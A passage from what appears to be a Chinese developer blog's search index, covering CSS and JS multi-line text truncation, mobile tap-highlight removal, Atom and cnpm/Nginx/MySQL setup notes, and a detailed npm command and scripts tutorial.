&#123; float: right; font-size: 12px; /* f */ width: 50px; /* w */ height: 18px; /* h */ margin-top: -18px; /* -h */&#125;&lt;/style&gt;&lt;div class="ellipsis"&gt; &lt;div class="ellipsis-container"&gt; &lt;div class="ellipsis-content"&gt;腾讯成立于1998年11月，是目前中国领先的互联网增值服务提供商之一。成立10多年来，腾讯一直秉承“一切以用户价值为依归”的经营理念，为亿级海量用户提供稳定优质的各类服务，始终处于稳健发展状态。2004年6月16日，腾讯控股有限公司在香港联交所主板公开上市(股票代号700)。&lt;/div&gt; &lt;div class="ellipsis-ghost"&gt; &lt;div class="ellipsis-placeholder"&gt;&lt;/div&gt; &lt;div class="ellipsis-more"&gt;...更多&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 优点： 响应式截断，根据不同宽度做出调整。 文本超出范围才显示省略号，否则不显示省略号。 可以在尾部添加更多的操作 缺点： 因为 -webkit-line-clamp 是一个不规范的属性，它没有出现在 CSS 规范草案中。也就是说只有 webkit 内核的浏览器才支持这个属性，像 Firefox, IE 浏览器统统都不支持这个属性，浏览器兼容性不好。 省略号位置不好控制 使用场景： 多用于移动端页面，因为移动设备浏览器更多是基于 webkit 内核，除了兼容性不好，实现截断的效果不错。 适配不同机型 不同浏览器的默认字体可能不同，建议设置这个字体，这个字体将…显示为空白正方形，font-size的值就是字符的宽 1234 @font-face &#123;font-family: "more";src: url(data:application/x-font-ttf;charset=utf-8;base64,AAEAAAAKAIAAAwAgT1MvMi85nScAAACsAAAAYGNtYXAAECHwAAABDAAAAVJnbHlmHJQQ0QAAAmAAAAAcaGVhZAzV4GIAAAJ8AAAANmhoZWEHwgPCAAACtAAAACRobXR4BAAAAAAAAtgAAAAGbG9jYQAOAAAAAALgAAAABm1heHAABAAGAAAC6AAAACBuYW1lGDPoTwAAAwgAAAGGcG9zdACvAAIAAASQAAAAJgAEBAABkAAFAAACmQLMAAAAjwKZAswAAAHrADMBCQAAAAAAAAAAAAAAAIAAAAEQAAAAAAAAAAAAAAAAAAAAAEAgJv/9A8D/wABAA8AAQAAAAAEAAAAAAAAAAAAAACAAAAAAAAMAAAADAAAAHAABAAAAAABMAAMAAQAAABwABAAwAAAACAAIAAIAACAm//3/////AAAgJv/9/////9/bAAMAAQABAAAAAAAAAAAAAAEGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA/8EEAAO/AAMAAAERIREEAPwAA7/8AgP+AAEAAAABAACqw1blXw889QALBAAAAAAA1QO70wAAAADUsuASAAD/wQQAA78AAAAIAAIAAAAAAAAAAQAAA8D/wAAABAAAAAAABAAAAQAAAAAAAAAAAAAAAAAAAAEEAAAAAAAAAAAAAAAADgAAAAEAAAACAAQAAQAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAOAK4AAQAAAAAAAQAHAAAAAQAAAAAAAgAHAAcAAQAAAAAAAwAHAA4AAQAAAAAABAAHABUAAQAAAAAABQALABwAAQAAAAAABgAHACcAAQAAAAAACgAaAC4AAwABBAkAAQAOAEgAAwABBAkAAgAOAFYAAwABBAkAAwAOAGQAAwABBAkABAAOAHIAAwABBAkABQAWAIAAAwABBAkABgAOAJYAAwABBAkACgA0AKRpY29tb29uUmVndWxhcmljb21vb25pY29tb29uVmVyc2lvbiAxLjBpY29tb29uRm9udCBnZW5lcmF0ZWQgYnkgSWNvTW9vbi4AaQBjAG8AbQBvAG8AbgBSAGUAZwB1AGwAYQByAGkAYwBvAG0AbwBvAG4AaQBjAG8AbQBvAG8AbgBWAGUAcgBzAGkAbwBuACAAMQAuADAAaQBjAG8AbQBvAG8AbgBGAG8AbgB0ACAAZwBlAG4AZQByAGEAdABlAGQAIABiAHkAIABJAGMAbwBNAG8AbwBuAC4AAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAACrAAA=) format("truetype");&#125; line-clamp有3宗罪 text-align:justify一起用会使省略号和文字相叠 超出截断后会截掉部分行高 省略号出现在单词中间 题主自己玩的显示溢出字数，不明所以 js实现 来源于 http://hai.li/2016/03/05/multiline-overflow-ellipsis.html ，借助 getClientRects 实现 1234567891011121314151617181920212223242526272829303132333435 function getRowRects(element) &#123; var rects = [], clientRects = element.getClientRects(), len = clientRects.length, clientRect, top, rectsLen, rect, i; for(i=0; i&lt;len; i++) &#123; has = false; rectsLen = rects.length; clientRect = clientRects[i]; top = clientRect.top; while(rectsLen--) &#123; rect = rects[rectsLen]; if (rect.top == top) &#123; has = true; break; &#125; &#125; if(has) &#123; rect.right = rect.right &gt; clientRect.right ? rect.right : clientRect.right; rect.width = rect.right - rect.left; &#125; else &#123; rects.push(&#123; top: clientRect.top, right: clientRect.right, bottom: clientRect.bottom, left: clientRect.left, width: clientRect.width, height: clientRect.height &#125;); &#125; &#125; return rects;&#125; 在线示例：https://codepen.io/defims/pen/jqWMJG 某些公司的做法 Google Plus用透明到白色的渐变遮罩，渐变遮罩在文字超出的时候才显示，但无法挤出文字，且背景只能纯色，不理想。 豌豆荚则更简单粗暴换行显示，换行显示则文字未超出时依然显示 …xxx，更不理想！ 出处地址 https://segmentfault.com/a/1190000008649988 https://segmentfault.com/a/1190000016879657 http://hai.li/2016/03/05/multiline-overflow-ellipsis.html]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>文字截断</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手机端去除阴影]]></title>
    <url>%2Fblob%2F2017-11-27-shadow-removal-on-mobile-phone%2F</url>
    <content type="text"><![CDATA[手机端去除阴影 1 -webkit-tap-highlight-color: rgba(0,0,0,0); 还有如下未验证解决方案 12345 a &#123; -webkit-tap-highlight-color: transparent; -webkit-touch-callout: none; -webkit-user-select: none;&#125;]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDE Atom 安装]]></title>
    <url>%2Fblob%2F2017-09-14-ide-atom-installation%2F</url>
    <content type="text"><![CDATA[安装C/C++运行环境需要安装 python（https://www.python.org/）或者visual studio， 安装Atom下载 https://atom.io/ 设置系统环境变量管理员打开cmd 12345678 Windows temporary:set ATOM_NODE_URL=http://gh-contractor-zcbenz.s3.amazonaws.com/atom-shell/distWindows permanently:setx ATOM_NODE_URL http://gh-contractor-zcbenz.s3.amazonaws.com/atom-shell/dist /MLinuxexport ATOM_NODE_URL=http://gh-contractor-zcbenz.s3.amazonaws.com/atom-shell/dist 开始使用]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDE</tag>
        <tag>工具</tag>
        <tag>Atom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cnpm安装与启动]]></title>
    <url>%2Fblob%2F2017-09-12-installation-and-startup-of-cnpm%2F</url>
    <content type="text"><![CDATA[Node安装 安装目录：/usr/local/node安装命令：copy启动命令：环境变量指向此位置，无需 Python3安装 安装目录：/usr/local/python3环境变量执行此位置 export PATH=/usr/local/python3/bin:/usr/local/node/bin:$PATH Nginx安装 安装目录：/usr/local/nginx安装命令： 123 ./configure --user=www --group=www --prefix=/usr/local/nginx --with-http_ssl_module --with-http_sub_module --with-http_gzip_static_module --with-http_stub_status_module --with-http_realip_modulemakemake install 启动命令： 1234 #cp /usr/local/nginx/sbin #./nginx#ps -ef | grep nginx #kill -9 23325 Mysql安装 安装目录： 12345678910 [root@rhel5 ~]# find / -name mysql -print/etc/logrotate.d/mysql/etc/rc.d/init.d/mysql/var/lib/mysql/var/lib/mysql/mysql/var/lock/subsys/mysql/usr/lib/mysql/usr/include/mysql/usr/share/mysql/usr/bin/mysql 而 data默认放在：/var/lib/mysqlmysql默认安装在了：/usr/share/mysql中安装命令：rpm安装启动命令：service mysql start Cnpmjs.org安装 安装目录：/root/cnpmjs.org-2.6.2安装命令：copy启动命令：#cp /root/cnpmjs.org-2.6.2 #node dispatch.js 访问： 12 http://192.168.33.21:7001http://192.168.33.21:7002 使用npm的时候也可以加上 –verbose参数来查看更详细的日志]]></content>
      <categories>
        <category>Npm</category>
      </categories>
      <tags>
        <tag>杂项</tag>
        <tag>cnpm</tag>
        <tag>自定义npm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[npm模块管理器]]></title>
    <url>%2Fblob%2F2017-09-11-npm-module-manager%2F</url>
    <content type="text"><![CDATA[简介 npm有两层含义。一层含义是Node的开放式模块登记和管理系统，网址为npmjs.org。另一层含义是Node默认的模块管理器，是一个命令行下的软件，用来安装和管理Node模块。 npm不需要单独安装。在安装Node的时候，会连带一起安装npm。但是，Node附带的npm可能不是最新版本，最好用下面的命令，更新到最新版本。 1 $ npm install npm@latest -g 上面的命令中，@latest表示最新版本，-g表示全局安装。所以，命令的主干是npm install npm，也就是使用npm安装自己。之所以可以这样，是因为npm本身与Node的其他模块没有区别。 然后，运行下面的命令，查看各种信息。 1234567891011 # 查看 npm 命令列表$ npm help# 查看各个命令的简单用法$ npm -l# 查看 npm 的版本$ npm -v# 查看 npm 的配置$ npm config list -l npm init npm init用来初始化生成一个新的package.json文件。它会向用户提问一系列问题，如果你觉得不用修改默认配置，一路回车就可以了。 如果使用了-f（代表force）、-y（代表yes），则跳过提问阶段，直接生成一个新的package.json文件。 1 $ npm init -y npm set npm set用来设置环境变量。 1234 $ npm set init-author-name 'Your name'$ npm set init-author-email 'Your email'$ npm set init-author-url 'http://yourdomain.com'$ npm set init-license 'MIT' 上面命令等于为npm init设置了默认值，以后执行npm init的时候，package.json的作者姓名、邮件、主页、许可证字段就会自动写入预设的值。这些信息会存放在用户主目录的 ~/.npmrc文件，使得用户不用每个项目都输入。如果某个项目有不同的设置，可以针对该项目运行npm config。 1 $ npm set save-exact true 上面命令设置加入模块时，package.json将记录模块的确切版本，而不是一个可选的版本范围。 npm config 1 $ npm config set prefix $dir 上面的命令将指定的$dir目录，设为模块的全局安装目录。如果当前有这个目录的写权限，那么运行npm install的时候，就不再需要sudo命令授权了。 1 $ npm config set save-prefix ~ 上面的命令使得npm install --save和npm install --save-dev安装新模块时，允许的版本范围从克拉符号（^）改成波浪号（~），即从允许小版本升级，变成只允许补丁包的升级。 12 $ npm config set init.author.name $name$ npm config set init.author.email $email 上面命令指定使用npm init时，生成的package.json文件的字段默认值。 npm info npm info命令可以查看每个模块的具体信息。比如，查看underscore模块的信息。 12345678910111213141516171819 $ npm info underscore&#123; name: 'underscore', description: 'JavaScript\'s functional programming helper library.', 'dist-tags': &#123; latest: '1.5.2', stable: '1.5.2' &#125;, repository: &#123; type: 'git', url: 'git://github.com/jashkenas/underscore.git' &#125;, homepage: 'http://underscorejs.org', main: 'underscore.js', version: '1.5.2', devDependencies: &#123; phantomjs: '1.9.0-1' &#125;, licenses: &#123; type: 'MIT', url: 'https://raw.github.com/jashkenas/underscore/master/LICENSE' &#125;, files: [ 'underscore.js', 'underscore-min.js', 'LICENSE' ], readmeFilename: 'README.md'&#125; 上面命令返回一个JavaScript对象，包含了underscore模块的详细信息。这个对象的每个成员，都可以直接从info命令查询。 12345678 $ npm info underscore descriptionJavaScript's functional programming helper library.$ npm info underscore homepagehttp://underscorejs.org$ npm info underscore version1.5.2 npm search npm search命令用于搜索npm仓库，它后面可以跟字符串，也可以跟正则表达式。 1 $ npm search &lt;搜索词&gt; 下面是一个例子。 123456 $ npm search node-gyp// NAME DESCRIPTION// autogypi Autogypi handles dependencies for node-gyp projects.// grunt-node-gyp Run node-gyp commands from Grunt.// gyp-io Temporary solution to let node-gyp run `rebuild` under…// ... npm list npm list命令以树型结构列出当前项目安装的所有模块，以及它们依赖的模块。 1 $ npm list 加上global参数，会列出全局安装的模块。 1 $ npm list -global npm list命令也可以列出单个模块。 1 $ npm list underscore npm install 基本用法 Node模块采用npm install命令安装。 每个模块可以“全局安装”，也可以“本地安装”。“全局安装”指的是将一个模块安装到系统目录中，各个项目都可以调用。一般来说，全局安装只适用于工具模块，比如eslint和gulp。“本地安装”指的是将一个模块下载到当前项目的node_modules子目录，然后只有在项目目录之中，才能调用这个模块。 123456 # 本地安装$ npm install &lt;package name&gt;# 全局安装$ sudo npm install -global &lt;package name&gt;$ sudo npm install -g &lt;package name&gt; npm install也支持直接输入Github代码库地址。 12 $ npm install git://github.com/package/path.git$ npm install git://github.com/package/path.git#0.1.0 安装之前，npm install会先检查，node_modules目录之中是否已经存在指定模块。如果存在，就不再重新安装了，即使远程仓库已经有了一个新版本，也是如此。 如果你希望，一个模块不管是否安装过，npm 都要强制重新安装，可以使用-f或--force参数。 1 $ npm install &lt;packageName&gt; --force 如果你希望，所有模块都要强制重新安装，那就删除node_modules目录，重新执行npm install。 12 $ rm -rf node_modules$ npm install 安装不同版本 install命令总是安装模块的最新版本，如果要安装模块的特定版本，可以在模块名后面加上@和版本号。 123 $ npm install sax@latest$ npm install sax@0.1.1$ npm install sax@"&gt;=0.1.0 &lt;0.2.0" 如果使用--save-exact参数，会在package.json文件指定安装模块的确切版本。 1 $ npm install readable-stream --save --save-exact install命令可以使用不同参数，指定所安装的模块属于哪一种性质的依赖关系，即出现在packages.json文件的哪一项中。 –save：模块名将被添加到dependencies，可以简化为参数-S。–save-dev: 模块名将被添加到devDependencies，可以简化为参数-D。 12345 $ npm install sax --save$ npm install node-tap --save-dev# 或者$ npm install sax -S$ npm install node-tap -D 如果要安装beta版本的模块，需要使用下面的命令。 12345 # 安装最新的beta版$ npm install &lt;module-name&gt;@beta (latest beta)# 安装指定的beta版$ npm install &lt;module-name&gt;@1.3.1-beta.3 npm install默认会安装dependencies字段和devDependencies字段中的所有模块，如果使用--production参数，可以只安装dependencies字段的模块。 123 $ npm install --production# 或者$ NODE_ENV=production npm install 一旦安装了某个模块，就可以在代码中用require命令加载这个模块。 12 var backbone = require('backbone')console.log(backbone.VERSION) 避免系统权限 默认情况下，Npm全局模块都安装在系统目录（比如/usr/local/lib/），普通用户没有写入权限，需要用到sudo命令。这不是很方便，我们可以在没有root权限的情况下，安装全局模块。 首先，在主目录下新建配置文件.npmrc，然后在该文件中将prefix变量定义到主目录下面。 1 prefix = /home/yourUsername/npm 然后在主目录下新建npm子目录。 1 $ mkdir ~/npm 此后，全局安装的模块都会安装在这个子目录中，npm也会到~/npm/bin目录去寻找命令。 最后，将这个路径在.bash_profile文件（或.bashrc文件）中加入PATH变量。 1 export PATH=~/npm/bin:$PATH npm update，npm uninstall npm update命令可以更新本地安装的模块。 12345 # 升级当前项目的指定模块$ npm update [package name]# 升级全局安装的模块$ npm update -global [package name] 它会先到远程仓库查询最新版本，然后查询本地版本。如果本地版本不存在，或者远程版本较新，就会安装。 使用-S或--save参数，可以在安装的时候更新package.json里面模块的版本号。 123456789 // 更新之前的package.jsondependencies: &#123; dep1: "^1.1.1"&#125;// 更新之后的package.jsondependencies: &#123; dep1: "^1.2.2"&#125; 注意，从npm v2.6.1 开始，npm update只更新顶层模块，而不更新依赖的依赖，以前版本是递归更新的。如果想取到老版本的效果，要使用下面的命令。 1 $ npm --depth 9999 update npm uninstall命令，卸载已安装的模块。 1234 $ npm uninstall [package name]# 卸载全局模块$ npm uninstall [package name] -global npm run npm不仅可以用于模块管理，还可以用于执行脚本。package.json文件有一个scripts字段，可以用于指定脚本命令，供npm直接调用。 123456789101112 &#123; "name": "myproject", "devDependencies": &#123; "jshint": "latest", "browserify": "latest", "mocha": "latest" &#125;, "scripts": &#123; "lint": "jshint **.js", "test": "mocha test/" &#125;&#125; 上面代码中，scripts字段指定了两项命令lint和test。命令行输入npm run-script lint或者npm run lint，就会执行jshint **.js，输入npm run-script test或者npm run test，就会执行mocha test/。npm run是npm run-script的缩写，一般都使用前者，但是后者可以更好地反应这个命令的本质。 npm run命令会自动在环境变量$PATH添加node_modules/.bin目录，所以scripts字段里面调用命令时不用加上路径，这就避免了全局安装NPM模块。 npm run如果不加任何参数，直接运行，会列出package.json里面所有可以执行的脚本命令。 npm内置了两个命令简写，npm test等同于执行npm run test，npm start等同于执行npm run start。 npm run会创建一个Shell，执行指定的命令，并临时将node_modules/.bin加入PATH变量，这意味着本地模块可以直接运行。 举例来说，你执行ESLint的安装命令。 1 $ npm i eslint --save-dev 运行上面的命令以后，会产生两个结果。首先，ESLint被安装到当前目录的node_modules子目录；其次，node_modules/.bin目录会生成一个符号链接node_modules/.bin/eslint，指向ESLint模块的可执行脚本。 然后，你就可以在package.json的script属性里面，不带路径的引用eslint这个脚本。 123456789 &#123; "name": "Test Project", "devDependencies": &#123; "eslint": "^1.10.3" &#125;, "scripts": &#123; "lint": "eslint ." &#125;&#125; 等到运行npm run lint的时候，它会自动执行./node_modules/.bin/eslint .。 如果直接运行npm run不给出任何参数，就会列出scripts属性下所有命令。 123456 $ npm runAvailable scripts in the user-service package: lint jshint **.js test mocha test/ 下面是另一个package.json文件的例子。 123456 "scripts": &#123; "watch": "watchify client/main.js -o public/app.js -v", "build": "browserify client/main.js -o public/app.js", "start": "npm run watch &amp; nodemon server.js", "test": "node test/all.js"&#125;, 上面代码在scripts项，定义了四个别名，每个别名都有对应的脚本命令。 1234 $ npm run watch$ npm run build$ npm run start$ npm run test 其中，start和test属于特殊命令，可以省略run。 12 $ npm start$ npm test 如果希望一个操作的输出，是另一个操作的输入，可以借用Linux系统的管道命令，将两个操作连在一起。 1 "build-js": "browserify browser/main.js | uglifyjs -mc &gt; static/bundle.js" 但是，更方便的写法是引用其他npm run命令。 1 "build": "npm run build-js &amp;&amp; npm run build-css" 上面的写法是先运行npm run build-js，然后再运行npm run build-css，两个命令中间用&amp;&amp;连接。如果希望两个命令同时平行执行，它们中间可以用&amp;连接。 下面是一个流操作的例子。 12345678 "devDependencies": &#123; "autoprefixer": "latest", "cssmin": "latest"&#125;,"scripts": &#123; "build:css": "autoprefixer -b 'last 2 versions' &lt; assets/styles/main.css | cssmin &gt; dist/main.css"&#125; 写在scripts属性中的命令，也可以在node_modules/.bin目录中直接写成bash脚本。下面是一个bash脚本。 1234 #!/bin/bashcd site/mainbrowserify browser/main.js | uglifyjs -mc &gt; static/bundle.js 假定上面的脚本文件名为build.sh，并且权限为可执行，就可以在scripts属性中引用该文件。 1 "build-js": "bin/build.sh" 参数 npm run命令还可以添加参数。 123 "scripts": &#123; "test": "mocha test/"&#125; 上面代码指定npm test，实际运行mocha test/。如果要通过npm test命令，将参数传到mocha，则参数之前要加上两个连词线。 123 $ npm run test -- anothertest.js# 等同于$ mocha test/ anothertest.js 上面命令表示，mocha要运行所有test子目录的测试脚本，以及另外一个测试脚本anothertest.js。 npm run本身有一个参数-s，表示关闭npm本身的输出，只输出脚本产生的结果。 12345 // 输出npm命令头$ npm run test// 不输出npm命令头$ npm run -s test scripts脚本命令最佳实践 scripts字段的脚本命令，有一些最佳实践，可以方便开发。首先，安装npm-run-all模块。 1 $ npm install npm-run-all --save-dev 这个模块用于运行多个scripts脚本命令。 123456789101112131415161718 # 继发执行$ npm-run-all build:html build:js# 等同于$ npm run build:html &amp;&amp; npm run build:js# 并行执行$ npm-run-all --parallel watch:html watch:js# 等同于$ npm run watch:html &amp; npm run watch:js# 混合执行$ npm-run-all clean lint --parallel watch:html watch:js# 等同于$ npm-run-all clean lint$ npm-run-all --parallel watch:html watch:js# 通配符$ npm-run-all --parallel watch:* ###（1）start脚本命令 start脚本命令，用于启动应用程序。 1 "start": "npm-run-all --parallel dev serve" 上面命令并行执行dev脚本命令和serve脚本命令，等同于下面的形式。 1 $ npm run dev &amp; npm run serve 如果start脚本没有配置，npm start命令默认执行下面的脚本，前提是模块的根目录存在一个server.js文件。 1 $ node server.js ###（2）dev脚本命令 dev脚本命令，规定开发阶段所要做的处理，比如构建网页资源。 1 "dev": "npm-run-all dev:*" 上面命令用于继发执行所有dev的子命令。 1 "predev:sass": "node-sass --source-map src/css/hoodie.css.map --output-style nested src/sass/base.scss src/css/hoodie.css" 上面命令将sass文件编译为css文件，并生成source map文件。 1 "dev:sass": "node-sass --source-map src/css/hoodie.css.map --watch --output-style nested src/sass/base.scss src/css/hoodie.css" 上面命令会监视sass文件的变动，只要有变动，就自动将其编译为css文件。 1 "dev:autoprefix": "postcss --use autoprefixer --autoprefixer.browsers \"&gt; 5%\" --output src/css/hoodie.css src/css/hoodie.css" 上面命令为css文件加上浏览器前缀，限制条件是只考虑市场份额大于5%的浏览器。 ###（3）serve脚本命令 serve脚本命令用于启动服务。 1 "serve": "live-server dist/ --port=9090" 上面命令启动服务，用的是live-server模块，将服务启动在9090端口，展示dist子目录。 live-server模块有三个功能。 启动一个HTTP服务器，展示指定目录的index.html文件，通过该文件加载各种网络资源，这是file://协议做不到的。添加自动刷新功能。只要指定目录之中，文件有任何变化，它就会刷新页面。npm run serve命令执行以后，自动打开浏览器。、 以前，上面三个功能需要三个模块来完成：http-server、live-reload和opener，现在只要live-server一个模块就够了。 ###（4）test脚本命令 test脚本命令用于执行测试。 12 "test": "npm-run-all test:*","test:lint": "sass-lint --verbose --config .sass-lint.yml src/sass/*" 上面命令规定，执行测试时，运行lint脚本，检查脚本之中的语法错误。 ###（5）prod脚本命令 prod脚本命令，规定进入生产环境时需要做的处理。 123 "prod": "npm-run-all prod:*","prod:sass": "node-sass --output-style compressed src/sass/base.scss src/css/prod/hoodie.min.css","prod:autoprefix": "postcss --use autoprefixer --autoprefixer.browsers "&gt; 5%" --output src/css/prod/hoodie.min.css src/css/prod/hoodie.min.css" 上面命令将sass文件转为css文件，并加上浏览器前缀。 ###（6）help脚本命令 help脚本命令用于展示帮助信息。 1 "help": "markdown-chalk --input DEVELOPMENT.md" 上面命令之中，markdown-chalk模块用于将指定的markdown文件，转为彩色文本显示在终端之中。 ###（7）docs脚本命令 docs脚本命令用于生成文档。 1 "docs": "kss-node --source src/sass --homepage ../../styleguide.md" 上面命令使用kss-node模块，提供源码的注释生成markdown格式的文档。 pre- 和 post- 脚本 npm run为每条命令提供了pre-和post-两个钩子（hook）。以npm run lint为例，执行这条命令之前，npm会先查看有没有定义prelint和postlint两个钩子，如果有的话，就会先执行npm run prelint，然后执行npm run lint，最后执行npm run postlint。 12345678910111213 &#123; "name": "myproject", "devDependencies": &#123; "eslint": "latest" "karma": "latest" &#125;, "scripts": &#123; "lint": "eslint --cache --ext .js --ext .jsx src", "test": "karma start --log-leve=error karma.config.js --single-run=true", "pretest": "npm run lint", "posttest": "echo 'Finished running tests'" &#125;&#125; 上面代码是一个package.json文件的例子。如果执行npm test，会按下面的顺序执行相应的命令。 pretest test posttest 如果执行过程出错，就不会执行排在后面的脚本，即如果prelint脚本执行出错，就不会接着执行lint和postlint脚本。 下面是一个例子。 12345 &#123; "test": "karma start", "test:lint": "eslint . --ext .js --ext .jsx", "pretest": "npm run test:lint"&#125; 上面代码中，在运行npm run test之前，会自动检查代码，即运行npm run test:lint命令。 下面是一些常见的pre-和post-脚本。 prepublish：发布一个模块前执行。postpublish：发布一个模块后执行。preinstall：用户执行npm install命令时，先执行该脚本。postinstall：用户执行npm install命令时，安装结束后执行该脚本，通常用于将下载的源码编译成用户需要的格式，比如有些模块需要在用户机器上跟本地的C++模块一起编译。preuninstall：卸载一个模块前执行。postuninstall：卸载一个模块后执行。preversion：更改模块版本前执行。postversion：更改模块版本后执行。pretest：运行npm test命令前执行。posttest：运行npm test命令后执行。prestop：运行npm stop命令前执行。poststop：运行npm stop命令后执行。prestart：运行npm start命令前执行。poststart：运行npm start命令后执行。prerestart：运行npm restart命令前执行。postrestart：运行npm restart命令后执行。 对于最后一个npm restart命令，如果没有设置restart脚本，prerestart和postrestart会依次执行stop和start脚本。 另外，不能在pre脚本之前再加pre，即prepretest脚本不起作用。 注意，即使Npm可以自动运行pre和post脚本，也可以手动执行它们。 1 $ npm run prepublish 下面是post install的例子。 123 &#123; "postinstall": "node lib/post_install.js"&#125; 上面的这个命令，主要用于处理从Git仓库拉下来的源码。比如，有些源码是用TypeScript写的，可能需要转换一下。 下面是publish钩子的一个例子。 1234567 &#123; "dist:modules": "babel ./src --out-dir ./dist-modules", "gh-pages": "webpack", "gh-pages:deploy": "gh-pages -d gh-pages", "prepublish": "npm run dist:modules", "postpublish": "npm run gh-pages &amp;&amp; npm run gh-pages:deploy"&#125; 上面命令在运行npm run publish时，会先执行Babel编译，然后调用Webpack构建，最后发到Github Pages上面。 以上都是npm相关操作的钩子，如果安装某些模块，还能支持Git相关的钩子。下面以husky模块为例。 1 $ npm install husky --save-dev 安装以后，就能在package.json添加precommit、prepush等钩子。 12345678 &#123; "scripts": &#123; "lint": "eslint yourJsFiles.js", "precommit": "npm run test &amp;&amp; npm run lint", "prepush": "npm run test &amp;&amp; npm run lint", "...": "..." &#125;&#125; 类似作用的模块还有pre-commit、precommit-hook等。 内部变量 scripts字段可以使用一些内部变量，主要是package.json的各种字段。 比如，package.json的内容是{&quot;name&quot;:&quot;foo&quot;, &quot;version&quot;:&quot;1.2.5&quot;}，那么变量npm_package_name的值是foo，变量npm_package_version的值是1.2.5。 12345 &#123; "scripts":&#123; "bundle": "mkdir -p build/$npm_package_version/" &#125;&#125; 运行npm run bundle以后，将会生成build/1.2.5/子目录。 config字段也可以用于设置内部字段。 1234567 "name": "fooproject","config": &#123; "reporter": "xunit"&#125;,"scripts": &#123; "test": "mocha test/ --reporter $npm_package_config_reporter"&#125; 上面代码中，变量npm_package_config_reporter对应的就是reporter。 通配符 npm的通配符的规则如下。 匹配0个或多个字符? 匹配1个字符[…] 匹配某个范围的字符。如果该范围的第一个字符是!或^，则匹配不在该范围的字符。!(pattern|pattern|pattern) 匹配任何不符合给定的模式?(pattern|pattern|pattern) 匹配0个或1个给定的模式+(pattern|pattern|pattern) 匹配1个或多个给定的模式(a|b|c) 匹配0个或多个给定的模式@(pattern|pat|pat?erN) 只匹配给定模式之一** 如果出现在路径部分，表示0个或多个子目录。 npm link 开发NPM模块的时候，有时我们会希望，边开发边试用，比如本地调试的时候，require(&#39;myModule&#39;)会自动加载本机开发中的模块。Node规定，使用一个模块时，需要将其安装到全局的或项目的node_modules目录之中。对于开发中的模块，解决方法就是在全局的node_modules目录之中，生成一个符号链接，指向模块的本地目录。 npm link就能起到这个作用，会自动建立这个符号链接。 请设想这样一个场景，你开发了一个模块myModule，目录为src/myModule，你自己的项目myProject要用到这个模块，项目目录为src/myProject。首先，在模块目录（src/myModule）下运行npm link命令。 1 src/myModule$ npm link 上面的命令会在NPM的全局模块目录内，生成一个符号链接文件，该文件的名字就是package.json文件中指定的模块名。 1 /path/to/global/node_modules/myModule -&gt; src/myModule 这个时候，已经可以全局调用myModule模块了。但是，如果我们要让这个模块安装在项目内，还要进行下面的步骤。 切换到项目目录，再次运行npm link命令，并指定模块名。 1 src/myProject$ npm link myModule 上面命令等同于生成了本地模块的符号链接。 1 src/myProject/node_modules/myModule -&gt; /path/to/global/node_modules/myModule 然后，就可以在你的项目中，加载该模块了。 1 var myModule = require('myModule'); 这样一来，myModule的任何变化，都可以直接反映在myProject项目之中。但是，这样也出现了风险，任何在myProject目录中对myModule的修改，都会反映到模块的源码中。 如果你的项目不再需要该模块，可以在项目目录内使用npm unlink命令，删除符号链接。 1 src/myProject$ npm unlink myModule npm bin npm bin命令显示相对于当前目录的，Node模块的可执行脚本所在的目录（即.bin目录）。 123 # 项目根目录下执行$ npm bin./node_modules/.bin npm adduser npm adduser用于在npmjs.com注册一个用户。 1234 $ npm adduserUsername: YOUR_USER_NAMEPassword: YOUR_PASSWORDEmail: YOUR_EMAIL@domain.com npm publish npm publish用于将当前模块发布到npmjs.com。执行之前，需要向npmjs.com申请用户名。 1 $ npm adduser 如果已经注册过，就使用下面的命令登录。 1 $ npm login 登录以后，就可以使用npm publish命令发布。 1 $ npm publish 如果当前模块是一个beta版，比如1.3.1-beta.3，那么发布的时候需要使用tag参数，将其发布到指定标签，默认的发布标签是latest。 1 $ npm publish --tag beta 如果发布私有模块，模块初始化的时候，需要加上scope参数。只有npm的付费用户才能发布私有模块。 1 $ npm init --scope=&lt;yourscope&gt; 如果你的模块是用ES6写的，那么发布的时候，最好转成ES5。首先，需要安装Babel。 1 $ npm install --save-dev babel-cli@6 babel-preset-es2015@6 然后，在package.json里面写入build脚本。 1234 "scripts": &#123; "build": "babel source --presets babel-preset-es2015 --out-dir distribution", "prepublish": "npm run build"&#125; 运行上面的脚本，会将source目录里面的ES6源码文件，转为distribution目录里面的ES5源码文件。然后，在项目根目录下面创建两个文件.npmignore和.gitignore，分别写入以下内容。 123456 // .npmignoresource// .gitignorenode_modulesdistribution npm deprecate 如果想废弃某个版本的模块，可以使用npm deprecate命令。 1 $ npm deprecate my-thing@"&lt; 0.2.3" "critical bug fixed in v0.2.3" 运行上面的命令以后，小于0.2.3版本的模块的package.json都会写入一行警告，用户安装这些版本时，这行警告就会在命令行显示。 1 npm owner 模块的维护者可以发布新版本。npm owner命令用于管理模块的维护者。 12345678 # 列出指定模块的维护者$ npm owner ls &lt;package name&gt;# 新增维护者$ npm owner add &lt;user&gt; &lt;package name&gt;# 删除维护者$ npm owner rm &lt;user&gt; &lt;package name&gt; 其他命令 npm home，npm repo npm home命令可以打开一个模块的主页，npm 